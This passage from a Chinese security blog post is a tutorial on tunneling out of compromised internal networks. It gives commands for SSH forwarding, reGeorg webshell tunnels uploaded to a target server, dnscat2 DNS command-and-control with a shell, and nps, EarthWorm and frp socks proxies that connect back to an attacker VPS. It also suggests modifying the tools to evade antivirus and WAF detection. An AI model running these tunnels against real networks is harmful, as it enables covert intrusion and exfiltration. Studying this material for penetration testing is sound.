+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ssh -CfNg -R &lt;vps port&gt;:&lt;目标主机 host&gt;:&lt;目标主机 port&gt; &lt;SSH VPS主机&gt;</span><br><span class="line"></span><br><span class="line">ssh  -CfNg -l 6666:10.1.1.1:3389 root@49.121.1.102</span><br></pre></td></tr></table></figure>
+
+
+
+<p>边界机把内网的端口，远程连接道VPS，远程转发道VPS</p>
+<h2 id="SSH-动态转发机制："><a href="#SSH-动态转发机制：" class="headerlink" title="SSH 动态转发机制："></a>SSH 动态转发机制：</h2><p>这里主要是建立一个动态的socks代理隧道</p>
+<p>在VPS上运行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh -CfNg -D 7000 &lt;SSH 边界主机&gt;</span><br><span class="line">ssh -CfNg -D 7000 root@192.168.1.1</span><br></pre></td></tr></table></figure>
+
+
+
+<p>VPS上7000端口上，开了一个socks代理，用代理软件就可以连接</p>
+<h2 id="HTTP-HTTPS协议隧道"><a href="#HTTP-HTTPS协议隧道" class="headerlink" title="HTTP HTTPS协议隧道"></a>HTTP HTTPS协议隧道</h2><ol>
+<li>reGeorg：</li>
+</ol>
+<p>将对应的脚本文件上传到目标服务器，根据不同的网站类型php    jsp    asp等，上传对应的脚本 reGeorg.php</p>
+<p>攻击机(VPS)运行：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python reGeorgSocksProxy.py -l 46.46.46.46（VPS的IP） -p 666（VPS端口） -u http:&#x2F;&#x2F;（目标服务器IP）&#x2F;reGeorg.php</span><br></pre></td></tr></table></figure>
+
+<p>然后在本地通过代理工具链接本地的666，就是链接好隧道了</p>
+<p>注意：这个查杀比较严重，建议会免杀的修改修改。</p>
+<p> 非常遗憾的是，目前大部分<code>WAF</code>都会针对默认原装版本的<code>reGeorg</code> 。（可以自己修改后使用）</p>
+<p>2.Neo-reGeorg </p>
+<p>这里推荐用 Neo-reGeorg 这个也不错，是重构reGeorg 的一个作品</p>
+<p><a href="https://github.com/L-codes/Neo-reGeorg" target="_blank" rel="noopener">https://github.com/L-codes/Neo-reGeorg</a></p>
+<p>用法类似：</p>
+<p>VPS上支持生成的服务端，默认 GET 请求响应指定的页面内容 (如伪装的404页面)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ python neoreg.py generate -k &lt;you_password&gt; --file 404.html</span><br></pre></td></tr></table></figure>
+
+<p>将相应的隧道文件放到目标服务器的web目录后使用neoreg连接web服务器并建立本地socks代理。</p>
+<p>VPS上运行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ python neoreg.py -k &lt;you_password&gt; -u &lt;server_url&gt; --proxy socks5:&#x2F;&#x2F;10.1.1.1:8080（本地代理地址）</span><br></pre></td></tr></table></figure>
+
+<p>Socks连接工具连接本地127.0.0.1:1080</p>
+<h2 id="DNS-隧道："><a href="#DNS-隧道：" class="headerlink" title="DNS 隧道："></a>DNS 隧道：</h2><p>dnscat2</p>
+<p>工具dnscat2，这是一DNS隧道，该工具旨在通过DNS协议创建加密的命令和控制（C＆C）通道，还有自己的控制台</p>
+<p>dnscat2分为两个部分：客户端和服务器。</p>
+<p>服务端为<code>Ruby</code>编写，需安装Ruby环境。kali系统内置Ruby，但是运行时仍可能报缺少一些gem依赖：</p>
+<p>服务端VPS：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">安装依赖：</span><br><span class="line">apt install gem</span><br><span class="line">apt install ruby-dev</span><br><span class="line">apt install libpq-dev</span><br><span class="line">apt install ruby-bundler</span><br><span class="line"></span><br><span class="line">下载并安装：</span><br><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;iagox86&#x2F;dnscat2.git</span><br><span class="line">cd dnscat2&#x2F;server</span><br><span class="line">sudo gem install bundler</span><br><span class="line"></span><br><span class="line">开启服务：</span><br><span class="line">ruby .&#x2F;dnscat2.rb vpn.zeo.com -e open</span><br></pre></td></tr></table></figure>
+
+<p>目标主机客户端：</p>
+<p>上传dnsClient.zip 到目标主机 解压</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;dnscat --dns server&#x3D;服务端ip,port&#x3D;53 --secret&#x3D;服务端生成的秘钥</span><br></pre></td></tr></table></figure>
+
+
+
+<p>直连模式使用方法：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">VPS中 server路径下：</span><br><span class="line">ruby .&#x2F;dnscat2</span><br><span class="line"></span><br><span class="line">客户端：（这个命令会在 上面服务启动后提示，可以参考下面的截图红框）</span><br><span class="line">.&#x2F;dnscat --dns server&#x3D;x.x.x.x,port&#x3D;53 --secret&#x3D;281fc7a7ec57d500d269c96b8ae36ba5</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://img-blog.csdnimg.cn/202005061043407.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">常用命令： </span><br><span class="line">window -i 1 进入交互 </span><br><span class="line">exec -c &quot;ping baidu.com&quot; 执行命令， 无回显 </span><br><span class="line">shell 返回一个半交互shell,会有一个id，记录此id </span><br><span class="line">ctrl+Z 返回</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="Socks代理："><a href="#Socks代理：" class="headerlink" title="Socks代理："></a>Socks代理：</h2><p>下面基本上都是可以支持多种协议，之介绍scoks的情况，大家可以自己查看使用方法</p>
+<p>也推荐使用这些工具</p>
+<p><strong>nps：</strong> <a href="https://github.com/ehang-io/nps" target="_blank" rel="noopener">https://github.com/ehang-io/nps</a> </p>
+<p><strong>ew：</strong><a href="https://github.com/idlefire/ew" target="_blank" rel="noopener">https://github.com/idlefire/ew</a></p>
+<p><strong>frp：</strong> <a href="https://github.com/fatedier/frp" target="_blank" rel="noopener">https://github.com/fatedier/frp</a> </p>
+<h2 id="推荐使用"><a href="#推荐使用" class="headerlink" title="推荐使用"></a>推荐使用</h2><h2 id="Nps"><a href="#Nps" class="headerlink" title="Nps"></a>Nps</h2><p>nps是一款轻量级、高性能、功能强大的<strong>内网穿透</strong>代理服务器。</p>
+<p> (<a href="https://github.com/ehang-io/nps" target="_blank" rel="noopener">https://github.com/ehang-io/nps</a>)</p>
+<p>优点：</p>
+<ul>
+<li>协议支持全面，兼容几乎所有常用协议，例如tcp、udp、http(s)、socks5、p2p、http代理…</li>
+<li>全平台兼容(linux、windows、macos、群辉等)，支持一键安装为系统服务</li>
+<li>操作简单，只需简单的配置即可在web ui上完成其余操作</li>
+<li>展示信息全面，流量、系统信息、即时带宽、客户端版本等</li>
+<li>扩展功能强大，该有的都有了（缓存、压缩、加密、流量限制、带宽限制、端口复用等等）</li>
+</ul>
+<p>环境说明: </p>
+<p>kali边界机: 192.168.5.123 192.168.3.2<br>kali2: 192.168.5.128 攻击者vps机器<br>win7:192.168.3.99 内网机器 </p>
+<p>1 启动服务端</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vim .&#x2F;conf&#x2F;nps.conf</span><br><span class="line">cd ..</span><br><span class="line">.&#x2F;nps. #启动服务</span><br></pre></td></tr></table></figure>
+
+<p>在服务端配置conf/nps.conf文件，修改用户名密码，端口号后启动服务,最好不要和已有的端口冲突</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">默认端口</span><br><span class="line">nps默认配置文件使用了80，443，8080，8024端口</span><br><span class="line"></span><br><span class="line">80与443端口为域名解析模式默认端口</span><br><span class="line"></span><br><span class="line">8080为web管理访问端口</span><br><span class="line"></span><br><span class="line">8024为网桥端口，用于客户端与服务器通信</span><br><span class="line"></span><br><span class="line">以上都可以在服务端配置conf&#x2F;nps.conf 自行修改</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/20200506104408292.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt=""></p>
+<p>直接访问自己设计的web端口 <a href="http://IP:8081/login/index" target="_blank" rel="noopener">http://IP:8081/login/index</a></p>
+<p>友好的操作界面！</p>
+<p><img src="https://img-blog.csdnimg.cn/20200506104440491.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>2 新增一个客户端，在配置中填写socks代理的密码</p>
+<p><img src="https://img-blog.csdnimg.cn/20200506104524136.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>3 记住唯一验证密钥和ID，连接使用</p>
+<p><img src="https://img-blog.csdnimg.cn/20200506104547485.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>4 客户端连接，上传npc到边界机</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npc.exe -server&#x3D;服务端ip:8024 -vkey&#x3D;生成的vkey -type&#x3D;tcp</span><br></pre></td></tr></table></figure>
+
+<p>成功上线，点击隧道配置代理</p>
+<p><img src="https://img-blog.csdnimg.cn/20200506104606195.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>新建隧道，协议很全</p>
+<p><img src="https://img-blog.csdnimg.cn/20200506104619902.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="\[(img-KVfWBLv0-1588732919232)(/Users/zy/Documents/文档文件/学习笔记/内网/内网隧道技术.assets/image-20200430111407478.png)\]"><br>这个界面十分友好，就不继续介绍，基本看一眼就会用了。</p>
+<h2 id="ew"><a href="#ew" class="headerlink" title="ew"></a>ew</h2><p> EarthWorm是一款用于开启 SOCKS v5 代理服务的工具，可以用于多层的内网穿透</p>
+<p>多层内网穿透可以去GitHub查找</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">VPS开启监听：</span><br><span class="line">.&#x2F;ew_for_linux64 -s rcsocks -l 1080 -e 1024</span><br><span class="line"></span><br><span class="line">边界机执行：</span><br><span class="line">ew_for_Win.exe -s rssocks -d 攻击Ip -e 1024</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20200506104758900.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>多层内网二层网络，A无外网 IP–vps 流量转发 +B 正向代理 +A作为跳板端口绑定</p>
+<p>VPS–边界机（可以出网）–内网机（目标网络内部主机，无法访问公网）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">VPS:</span><br><span class="line">.&#x2F;ew -s lcx_listen -l 1080 -e 8888</span><br><span class="line">边界机器:</span><br><span class="line">ew -s lcx_slave -d VPS_IP -e 666 -f 内网主机 -g 9999</span><br><span class="line">内网:</span><br><span class="line">ew -s sscoksd -l 9999</span><br></pre></td></tr></table></figure>
+
+<p>VPS将1080的代理请求转发到8888</p>
+<p>在边界机上，通过工具的 lcx_slave 方式，打通VPS:8888 和 内网机:9999 之间的通讯隧道</p>
+<p>在内网主机上利用 ssocksd 方式启动 9999 代理</p>
+<p>我们是可通过访问VPS:1080 来使用内网主机提供的 socks5 代理</p>
+<h2 id="Frp"><a href="#Frp" class="headerlink" title="Frp"></a>Frp</h2><ul>
+<li>frp 是一个可用于内网穿透的高性能的反向代理应用</li>
+<li>支持 tcp, udp 协议，为 http 和 https </li>
+</ul>
+<p>将 <strong>frps</strong> 及 <strong>frps.ini</strong> 放到具有公网 IP 的机器上。</p>
+<p>将 <strong>frpc</strong> 及 <strong>frpc.ini</strong> 放到处于内网环境的机器上。</p>
+<p>首先在vps上启动frp服务端,开启一个端口，默认是7000：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;frps -c frps.ini</span><br></pre></td></tr></table></figure>
+
+
+
+<p>再配置frp的客户端： </p>
+<ol>
+<li>修改 frpc.ini 文件，假设 frps 所在服务器的公网 IP 为 x.x.x.x：</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr &#x3D; x.x.x.x</span><br><span class="line">server_port &#x3D; 7000</span><br><span class="line"></span><br><span class="line">[socks5] </span><br><span class="line">type &#x3D; tcp </span><br><span class="line">remote_port &#x3D; 8881 </span><br><span class="line">plugin &#x3D; socks5 </span><br><span class="line">plugin_user &#x3D; root </span><br><span class="line">plugin_passwd &#x3D; root </span><br><span class="line">use_encryption &#x3D; true </span><br><span class="line">use_compression &#x3D; true</span><br></pre></td></tr></table></figure>
+
+<p>注意：上面的配置了用户名密码 root root 代理的时候注意要加上</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">最后两个配置是</span><br><span class="line">use_encryption &#x3D; true \\启用加密</span><br><span class="line">use_compression &#x3D; true  \\启用压缩</span><br></pre></td></tr></table></figure>
+
+
+
+<p>启动 frpc：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frpc.exe -c .&#x2F;frpc.ini</span><br></pre></td></tr></table></figure>
+
+<p>最后，使用代理软件连接服务端的8881建立连接</p>
+<h1 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h1><p>内网穿透的东西还是比较重要的，内网断网机常常都得用隧道，所以小结一下，上面介绍的工具基本上GITHUB都可以直接找见，所以师傅们自己去下载吧，也保险。</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/categories">分类</a></li>
+         
+          <li><a href="/projects_url">项目</a></li>
+         
+          <li><a href="/search/">搜索</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x00-内网穿透技术"><span class="toc-number">1.</span> <span class="toc-text">0x00 内网穿透技术</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-首先判断出网协议"><span class="toc-number">2.</span> <span class="toc-text">0x01 首先判断出网协议</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-各种协议隧道"><span class="toc-number">3.</span> <span class="toc-text">0x02 各种协议隧道</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#网络层"><span class="toc-number">4.</span> <span class="toc-text">网络层</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#ICMP隧道"><span class="toc-number">4.1.</span> <span class="toc-text">ICMP隧道</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Lcx"><span class="toc-number">4.2.</span> <span class="toc-text">Lcx</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#传输层"><span class="toc-number">5.</span> <span class="toc-text">传输层</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#瑞士军刀：nc"><span class="toc-number">5.1.</span> <span class="toc-text">瑞士军刀：nc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Powercat（powershell版的nc）"><span class="toc-number">5.2.</span> <span class="toc-text">Powercat（powershell版的nc）</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#应用层"><span class="toc-number">6.</span> <span class="toc-text">应用层</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#SSH转发："><span class="toc-number">6.1.</span> <span class="toc-text">SSH转发：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SSH-本地转发机制："><span class="toc-number">6.2.</span> <span class="toc-text">SSH 本地转发机制：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SSH-远程转发机制："><span class="toc-number">6.3.</span> <span class="toc-text">SSH 远程转发机制：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SSH-动态转发机制："><span class="toc-number">6.4.</span> <span class="toc-text">SSH 动态转发机制：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HTTP-HTTPS协议隧道"><span class="toc-number">6.5.</span> <span class="toc-text">HTTP HTTPS协议隧道</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DNS-隧道："><span class="toc-number">6.6.</span> <span class="toc-text">DNS 隧道：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Socks代理："><span class="toc-number">6.7.</span> <span class="toc-text">Socks代理：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#推荐使用"><span class="toc-number">6.8.</span> <span class="toc-text">推荐使用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Nps"><span class="toc-number">6.9.</span> <span class="toc-text">Nps</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ew"><span class="toc-number">6.10.</span> <span class="toc-text">ew</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Frp"><span class="toc-number">6.11.</span> <span class="toc-text">Frp</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03-总结"><span class="toc-number">7.</span> <span class="toc-text">0x03 总结</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://godzeo.github.io/2020/05/06/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E7%8B%B1-%E7%9F%A5%E8%AF%86-%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF%E5%B0%8F%E7%BB%93/" target="_blank" rel="noopener"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://godzeo.github.io/2020/05/06/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E7%8B%B1-%E7%9F%A5%E8%AF%86-%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF%E5%B0%8F%E7%BB%93/&text=内网安全学习从入门到入狱-知识-内网隧道技术小结" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://godzeo.github.io/2020/05/06/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E7%8B%B1-%E7%9F%A5%E8%AF%86-%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF%E5%B0%8F%E7%BB%93/&title=内网安全学习从入门到入狱-知识-内网隧道技术小结" target="_blank" rel="noopener"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://godzeo.github.io/2020/05/06/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E7%8B%B1-%E7%9F%A5%E8%AF%86-%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF%E5%B0%8F%E7%BB%93/&is_video=false&description=内网安全学习从入门到入狱-知识-内网隧道技术小结" target="_blank" rel="noopener"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=内网安全学习从入门到入狱-知识-内网隧道技术小结&body=Check out this article: https://godzeo.github.io/2020/05/06/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E7%8B%B1-%E7%9F%A5%E8%AF%86-%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF%E5%B0%8F%E7%BB%93/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https://godzeo.github.io/2020/05/06/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E7%8B%B1-%E7%9F%A5%E8%AF%86-%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF%E5%B0%8F%E7%BB%93/&title=内网安全学习从入门到入狱-知识-内网隧道技术小结" target="_blank" rel="noopener"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://godzeo.github.io/2020/05/06/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E7%8B%B1-%E7%9F%A5%E8%AF%86-%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF%E5%B0%8F%E7%BB%93/&title=内网安全学习从入门到入狱-知识-内网隧道技术小结" target="_blank" rel="noopener"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://godzeo.github.io/2020/05/06/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E7%8B%B1-%E7%9F%A5%E8%AF%86-%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF%E5%B0%8F%E7%BB%93/&title=内网安全学习从入门到入狱-知识-内网隧道技术小结" target="_blank" rel="noopener"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://godzeo.github.io/2020/05/06/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E7%8B%B1-%E7%9F%A5%E8%AF%86-%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF%E5%B0%8F%E7%BB%93/&title=内网安全学习从入门到入狱-知识-内网隧道技术小结" target="_blank" rel="noopener"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://godzeo.github.io/2020/05/06/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E7%8B%B1-%E7%9F%A5%E8%AF%86-%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF%E5%B0%8F%E7%BB%93/&name=内网安全学习从入门到入狱-知识-内网隧道技术小结&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=https://godzeo.github.io/2020/05/06/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E7%8B%B1-%E7%9F%A5%E8%AF%86-%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF%E5%B0%8F%E7%BB%93/&t=内网安全学习从入门到入狱-知识-内网隧道技术小结" target="_blank" rel="noopener"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2020
+    Zeo
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/categories">分类</a></li>
+         
+          <li><a href="/projects_url">项目</a></li>
+         
+          <li><a href="/search/">搜索</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+
+    <!-- jquery -->
+
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+
+<!-- clipboard -->
+
+  
+<script src="/lib/clipboard/clipboard.min.js"></script>
+
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
